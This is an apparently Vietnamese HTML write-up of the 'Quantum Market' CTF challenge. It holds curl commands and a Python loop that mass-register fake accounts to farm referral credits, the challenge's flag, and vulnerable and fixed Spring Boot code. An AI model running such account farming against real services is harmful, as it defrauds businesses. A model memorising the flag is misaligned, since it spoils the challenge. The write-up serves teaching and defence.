@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Quantum Market (Web CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.1rem; font-weight:700; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  .kw { color:#ff7b72; }
+  .st { color:#a5d6ff; }
+  .fn { color:#d2a8ff; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>🛒 Quantum Market — Referral farming: lỗi business logic kiếm tiền vô hạn</h1>
+  <div class="sub">Challenge Web (business logic) · HTB Event 3692 (NAB Internal CTF, medium) · <span class="muted">target: <code>http://154.57.164.68:41128</code> (docker đã stop)</span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được, <b>chưa nộp</b> — bạn tự submit ở portal HTB):<br>
+    <code>HTB{15_th1s_1nfin1t3_m0n3y_gl1tch??_0f503f4ae9431cf8c216a347aa96410b}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Breakthrough</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause (Spring Boot)</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên web (ví dụ tương đồng bằng Java Spring Boot) nhưng chưa chuyên sâu bảo mật. Bài này không khai thác lỗi kỹ thuật (SQLi, XSS...) mà khai thác <b>lỗi thiết kế nghiệp vụ</b> — chính xác hơn ở chỗ: thiếu thiết kế.</p>
+
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — Business logic flaw (lỗi nghiệp vụ) là gì?</h3>
+<div class="card">
+<p>Đây là nhóm lỗi mà <b>code chạy đúng như lập trình viên viết, nhưng sai như người thiết kế mong đợi</b>. Không có câu lệnh nào "bị hack" — hệ thống thiếu một ràng buộc nghiệp vụ (ví dụ: không giới hạn số lần nhận thưởng giới thiệu), và attacker chỉ việc dùng tính năng đúng cách… với quy mô không đúng.</p>
+<p>Tương đồng Spring Boot: bạn viết <code>POST /api/referrals</code> cộng 10 điểm cho người giới thiệu mỗi khi có người đăng ký mới — code không bug, nhưng bạn quên hỏi "nếu attacker tự tạo 10.000 tài khoản thì sao?". Đây là lỗi <b>thiếu rate-limit + thiếu cap tổng + thiếu xác minh danh tính người được giới thiệu</b>.</p>
+<div class="verify"><b>✔ Cách verify (khái niệm):</b> khi thấy một tính năng tạo ra giá trị (credit, điểm, voucher), luôn hỏi 3 câu: (1) một người dùng được dùng bao nhiêu lần? (2) tổng giá trị có trần không? (3) chi phí để lạm dụng là bao nhiêu? Nếu một trong ba câu không có câu trả lời → có lỗ hổng.</div>
+</div>
+
+<h3>0.2 — Bearer token là gì?</h3>
+<div class="card">
+<p>Server này dùng <b>JWT Bearer token</b>: sau khi login, server trả <code>{"access_token": "eyJ..."}</code>; mọi request sau phải kèm header <code>Authorization: Bearer eyJ...</code>. Khác với cookie (trình duyệt tự gửi), token này client phải tự gắn vào từng request — thiếu header là 401 "Not authenticated".</p>
+<p>Tương đồng Spring Boot: như khi bạn cấu hình <code>spring-boot-starter-oauth2-resource-server</code> với JWT — <code>SecurityContextHolder</code> chỉ có principal khi request mang đúng header.</p>
+</div>
+
+<h3>0.3 — Các cờ curl dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Cờ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>-s</code></td><td>im lặng</td><td>output chỉ còn body</td></tr>
+  <tr><td><code>-H 'Authorization: Bearer ...'</code></td><td>gửi token</td><td>mọi endpoint market đều yêu cầu</td></tr>
+  <tr><td><code>-H 'Content-Type: application/json'</code> + <code>-d</code></td><td>POST JSON body</td><td>register/login/purchase</td></tr>
+  <tr><td><code>python3 -c "...json..."</code></td><td>bóc tách token</td><td>lấy access_token từ response login dùng cho lệnh kế</td></tr>
+</table>
+</div>
+
+<h2 id="p1">Phần 1 — Recon: đề bài cho sẵn bản đồ</h2>
+<p class="muted">Đề bài nói "API Docs can be accessed through /docs/" — đây là recon rẻ nhất có thể.</p>
+
+<h3>1.1 — Đọc API docs (Swagger UI + openapi.json)</h3>
+<pre><code><span class="cm"># Swagger UI dành cho người, openapi.json dành cho máy</span>
+curl -s --max-time 20 http://154.57.164.68:41128/openapi.json -o openapi.json
+python3 -c <span class="st">"import json; d=json.load(open('openapi.json')); \
+[print(m.upper(), p) for p,ops in d['paths'].items() for m,op in ops.items() \
+ if m in ('get','post')]"</span></code></pre>
+<p>Kết quả thật — 8 endpoint:</p>
+<pre><code>POST /api/auth/register        <span class="cm"># đăng ký, có trường referrer_id</span>
+POST /api/auth/login           <span class="cm"># trả JWT Bearer token</span>
+GET  /api/market/profile       <span class="cm"># credits hiện có</span>
+GET  /api/market/shop          <span class="cm"># danh sách item + giá</span>
+POST /api/market/purchase      <span class="cm"># mua theo item_id</span>
+GET  /api/market/referrals     <span class="cm"># lịch sử referral</span>
+GET  /api/market/leaderboard
+GET  /api/market/my-items      <span class="cm"># đồ đã mua (kèm content)</span></code></pre>
+<div class="verify"><b>✔ Cách verify:</b> openapi.json parse được, in đúng 8 đường dẫn trên. Đặc biệt: <code>my-items</code> có trường <code>content</code> trong schema response — gợi ý flag nằm trong content của item mua được.</div>
+
+<h3>1.2 — Đăng ký + login + đọc shop</h3>
+<pre><code>B=http://154.57.164.68:41128
+<span class="cm"># đăng ký tài khoản chính</span>
+curl -s -X POST $B/api/auth/register -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"username":"pwnuser1","password":"pwnpass123"}'</span>
+<span class="cm"># login → lấy token</span>
+T1=$(curl -s -X POST $B/api/auth/login -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"username":"pwnuser1","password":"pwnpass123"}'</span> \
+  | python3 -c <span class="st">"import sys,json;print(json.load(sys.stdin)['access_token'])"</span>)
+<span class="cm"># đọc shop</span>
+curl -s -H <span class="st">"Authorization: Bearer $T1"</span> $B/api/market/shop</code></pre>
+<p>Kết quả thật — 10 item, item cuối cùng là mục tiêu:</p>
+<pre><code>id= 1  price=    25  Eonfall Survivor Rations Pack
+id= 2  price=    80  Celestial Senate Access Glyph
+id= 3  price=   120  Ghost Fleet Signal Scrambler
+id= 4  price=   200  Void Weaver Exploit Keys
+id= 5  price=   300  Star Forger Furnace Core Shard
+id= 6  price=   450  Quantum Trade Flux Injector
+id= 7  price=   600  Cosmic Scavenger Skiff Pass
+id= 8  price=   900  Chroniton Credit Doubler Module
+id= 9  price=  1100  Black Nebula Navigation Map
+id=10  price=  <span class="fn">1337</span>  <span class="fn">Market Manipulation Blueprint</span>   <span class="cm">← mục tiêu</span></code></pre>
+<div class="verify"><b>✔ Cách verify:</b> profile trả <code>{"credits":0}</code>; shop có item id=10 giá 1337. Phép tính tay: cần kiếm 1337 credits từ con số 0.</div>
+
+<h3>1.3 — Xác định nguồn credit duy nhất: referrals</h3>
+<pre><code><span class="cm"># schema của register cho thấy trường referrer_id</span>
+<span class="cm"># test: đăng ký user2 với referrer_id = username của user1</span>
+curl -s -X POST $B/api/auth/register -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"username":"pwnuser2","password":"pwnpass123","referrer_id":"pwnuser1"}'</span></code></pre>
+<p>Kết quả thật: <code>{"message":"User registered successfully","referral_bonus":"10 credits awarded to referrer"}</code> — và profile pwnuser1 tăng từ 0 → 10.</p>
+<div class="verify"><b>✔ Cách verify:</b> response register có chuỗi <code>10 credits awarded to referrer</code>; GET profile sau đó trả <code>"credits":10</code>. → 1 referral = 10 credits. Phép tính tay: 1337 / 10 = 133.7 → cần tối thiểu 134 referral.</div>
+
+<h2 id="p2">Phần 2 — Các hướng tấn công trực diện (thất bại, và cách verify)</h2>
+<p class="muted">Trước khi farm, phải loại trừ các đường tắt kỹ thuật.</p>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.1 — Purchase bất thường: item_id âm / không tồn tại</h3>
+<pre><code><span class="cm"># thử mua khi không đủ tiền, item_id âm, item_id lớn</span>
+curl -s -H <span class="st">"Authorization: Bearer $T1"</span> -X POST $B/api/market/purchase \
+  -H <span class="st">'Content-Type: application/json'</span> -d <span class="st">'{"item_id":10}'</span>     <span class="cm"># {"detail":"Insufficient credits"}</span>
+curl -s -H <span class="st">"Authorization: Bearer $T1"</span> -X POST $B/api/market/purchase \
+  -H <span class="st">'Content-Type: application/json'</span> -d <span class="st">'{"item_id":-10}'</span>    <span class="cm"># {"detail":"Item not found"}</span>
+curl -s -H <span class="st">"Authorization: Bearer $T1"</span> -X POST $B/api/market/purchase \
+  -H <span class="st">'Content-Type: application/json'</span> -d <span class="st">'{"item_id":99999}'</span> <span class="cm"># {"detail":"Item not found"}</span></code></pre>
+<p>Kết luận: server validate đúng — có kiểm tra đủ tiền, kiểm tra item tồn tại. Không có IDOR/integer trick ở lớp purchase. Đường duy nhất: kiếm đủ credits thật — tức là đánh vào cơ chế referral.</p>
+<div class="verify"><b>✔ Cách verify:</b> ba response lần lượt <code>Insufficient credits</code> / <code>Item not found</code> / <code>Item not found</code> — không có exception lộ stack trace, không có hint về bug kỹ thuật.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.2 — Self-referral trực tiếp không khả thi</h3>
+<pre><code><span class="cm"># referrer_id là username, phải tồn tại → user mới không thể tự referral chính mình</span>
+curl -s -X POST $B/api/auth/register -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"username":"selfref1","password":"x","referrer_id":"selfref1"}'</span></code></pre>
+<p>Kết quả thật: đăng ký thành công nhưng <code>referral_bonus: null</code> (username chưa tồn tại lúc validate → không có bonus). Kết luận: phải dùng 2 tài khoản trở lên luân phiên nhau, hoặc 1 tài khoản chính nhận referral từ hàng loạt tài khoản phụ. Hướng 2 đơn giản hơn và là hướng đi tiếp.</p>
+<div class="verify"><b>✔ Cách verify:</b> <code>referral_bonus</code> = <code>null</code> (không phải "10 credits") → self-referral không ăn.</div>
+
+<h2 id="p3">Phần 3 — Đột phá: farm 140 referral không giới hạn</h2>
+
+<h3>3.1 — Script farm</h3>
+<pre><code><span class="cm"># python: đăng ký 140 tài khoản phụ, referrer_id đều trỏ về pwnuser1</span>
+python3 -u /tmp/qm_farm.py</code></pre>
+<p>Nội dung script (rút gọn):</p>
+<pre><code><span class="kw">for</span> i <span class="kw">in</span> range(140):
+    post(<span class="st">"/api/auth/register"</span>,
+         {<span class="st">"username"</span>: f<span class="st">"refbot_{i:03d}"</span>, <span class="st">"password"</span>: <span class="st">"x12345678"</span>,
+          <span class="st">"referrer_id"</span>: <span class="st">"pwnuser1"</span>})</code></pre>
+<p>Kết quả thật: <code>DONE ok=140 fail=0</code> — <b>không rate-limit, không giới hạn số referral, không xác minh email, không cap tổng credit</b>. Đây chính là lỗi.</p>
+<div class="verify"><b>✔ Cách verify:</b> 140/140 request trả 200; GET profile pwnuser1 trả <code>{"credits":1410}</code> (= 10 ban đầu + 140 × 10). Phép tính tay kiểm chứng: 10 + 1400 = 1410 ✓.</div>
+
+<h3>3.2 — Tại sao gọi là "infinite money glitch"</h3>
+<p>Cơ chế referral bình thường dựa trên giả định: mỗi con người thật chỉ giới thiệu được vài người thật. Khi giả định đó vỡ (tạo tài khoản tự động không tốn kém gì), chi phí mỗi 10 credits ≈ 1 request HTTP (~0.1 giây). Item đắt nhất 1337 credits → khoảng 30 giây farm. Đây là lỗi <b>chi phí lạm dụng gần bằng không</b> — định nghĩa cốt lõi của business logic flaw.</p>
+
+<h2 id="p4">Phần 4 — Kết liễu: mua blueprint, lấy flag</h2>
+<pre><code><span class="cm"># mua item 10 bằng credits farm được</span>
+curl -s -H <span class="st">"Authorization: Bearer $T1"</span> -X POST $B/api/market/purchase \
+  -H <span class="st">'Content-Type: application/json'</span> -d <span class="st">'{"item_id":10}'</span>
+<span class="cm"># → {"message":"Item purchased successfully","item":"Market Manipulation Blueprint","credits_spent":1337}</span>
+
+<span class="cm"># flag nằm trong content của item</span>
+curl -s -H <span class="st">"Authorization: Bearer $T1"</span> $B/api/market/my-items</code></pre>
+<p>Kết quả thật (trích <code>content</code>):</p>
+<pre><code>BLUEPRINT_ACCESS_GRANTED
+
+This blueprint contains the secret to manipulating the Quantum Market core systems.
+The flag you seek is hidden within the market's own infrastructure.
+
+FLAG: HTB{15_th1s_1nfin1t3_m0n3y_gl1tch??_0f503f4ae9431cf8c216a347aa96410b}</code></pre>
+<div class="verify"><b>✔ Cách verify:</b> response purchase có <code>credits_spent:1337</code>; profile sau đó <code>credits:73</code> (= 1410 − 1337 ✓); <code>my-items</code> chứa chuỗi <code>FLAG: HTB{...}</code>.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
+  <tr><th>#</th><th>Hành động</th><th>Dựa vào đâu</th><th>Verify bằng</th></tr>
+  <tr><td>1</td><td>Đọc openapi.json</td><td>đề bài cho /docs/</td><td>8 endpoint + schema referrer_id</td></tr>
+  <tr><td>2</td><td>Xác định mục tiêu: item 10 giá 1337, credits 0</td><td>shop + profile</td><td>phép tính 1337/10 = 134 referral</td></tr>
+  <tr><td>3</td><td>Loại trừ đường tắt kỹ thuật</td><td>purchase với item_id bất thường</td><td>đều bị chặn đúng</td></tr>
+  <tr><td>4</td><td>Farm 140 referral</td><td>register nhận referrer_id, bonus 10</td><td>profile = 1410 credits</td></tr>
+  <tr><td>5</td><td>Mua item 10 → đọc my-items</td><td>content chứa flag</td><td>chuỗi FLAG: HTB{...}</td></tr>
+</table>
+
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Spring Boot</h2>
+
+<div class="spring bad-ex">
+  <div class="hd">❌ Code sai — cộng thưởng referral không giới hạn và không kiểm chứng người được giới thiệu</div>
+  <div class="bd"><pre><code><span class="kw">@PostMapping</span>(<span class="st">"/api/auth/register"</span>)
+<span class="kw">public</span> RegisterResponse register(<span class="kw">@RequestBody</span> RegisterRequest req) {
+    User user = userRepo.<span class="fn">save</span>(<span class="kw">new</span> User(req.username, hash(req.password)));
+    <span class="kw">if</span> (req.referrerId != <span class="kw">null</span>) {
+        User referrer = userRepo.<span class="fn">findByUsername</span>(req.referrerId);
+        <span class="kw">if</span> (referrer != <span class="kw">null</span>) {
+            <span class="cm">// DÒNG GÂY LỖI: cộng tiền mãi, không đếm đã nhận bao nhiêu,</span>
+            <span class="cm">// không kiểm tra người được giới thiệu có phải tài khoản rác không</span>
+            referrer.<span class="fn">addCredits</span>(REFERRAL_BONUS);   <span class="cm">// 10 credits, mọi lần</span>
+            userRepo.<span class="fn">save</span>(referrer);
+        }
+    }
+    <span class="kw">return</span> <span class="kw">new</span> RegisterResponse(user);
+}</code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Code sửa — referral phải có trần, có chi phí, có xác minh</div>
+  <div class="bd"><pre><code><span class="cm">// 1. Giới hạn tổng bonus mỗi referrer:</span>
+<span class="kw">if</span> (referrer.<span class="fn">getTotalReferralBonus</span>() &gt;= MAX_REFERRAL_BONUS) { <span class="cm">/* hết hạn mức */</span> }
+<span class="cm">// 2. Chỉ tính referral sau khi tài khoản được xác minh (email/điện thoại):</span>
+<span class="cm">//    → tạo 140 tài khoản rác không còn miễn phí nữa</span>
+<span class="cm">// 3. Rate-limit theo IP + theo referrer + theo device fingerprint:</span>
+<span class="fn">@RateLimited</span>(key = <span class="st">"register:{ip}"</span>, limit = 5, period = MINUTES)
+<span class="cm">// 4. Bonus theo lũy tiến giảm dần, hoặc yêu cầu người được giới thiệu</span>
+<span class="cm">//    phải có hoạt động thật (mua hàng, xác minh) mới trả thưởng</span></code></pre></div>
+</div>
+<p>Nguyên tắc chung: <b>mọi tính năng "tặng tiền" đều phải thiết kế với giả định attacker có thể tự động hóa việc nhận tiền</b>. Nếu chi phí lạm dụng &lt; giá trị nhận được, tính năng đó là máy in tiền cho attacker.</p>
+
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b>Đọc openapi.json ngay khi đề cho /docs/.</b> Toàn bộ bản đồ tấn công nằm trong đó — không cần đoán.</li>
+  <li><b>Định vị mục tiêu bằng phép tính.</b> Item đắc nhất giá 1337, bonus referral 10 → 134 lần. Con số cụ thể giúp chọn hướng đi.</li>
+  <li><b>Loại trừ đường tắt kỹ thuật trước.</b> Purchase đã validate chặt → năng lượng dồn hết vào cơ chế kiếm tiền.</li>
+  <li><b>Tính năng referral là mỏ vàng kinh điển.</b> Thiếu cap + thiếu xác minh + thiếu rate-limit = in tiền vô hạn. Luôn thử tạo tài khoản hàng loạt.</li>
+  <li><b>Flag thường nằm trong content của vật phẩm.</b> Mua xong nhớ đọc my-items chứ không chỉ nhìn message purchase.</li>
+  <li><b>Checklist tự làm lại:</b> spawn → openapi.json → register+login → shop (item 10 = 1337) → test purchase âm/không tồn tại → farm ≥134 referral → profile ≥ 1337 → purchase item 10 → my-items đọc flag → stop docker → tự submit.</li>
+</ol>
+</div>
+
+<p class="muted" style="margin-top:40px">Flag <code>HTB{15_th1s_1nfin1t3_m0n3y_gl1tch??_0f503f4ae9431cf8c216a347aa96410b}</code> đã lấy thành công nhưng <b>chưa nộp</b> — bạn tự submit ở portal HTB. Docker của challenge đã stop sau khi giải xong. Chúc mừng!</p>
+
+</div>
+</body>
+</html>
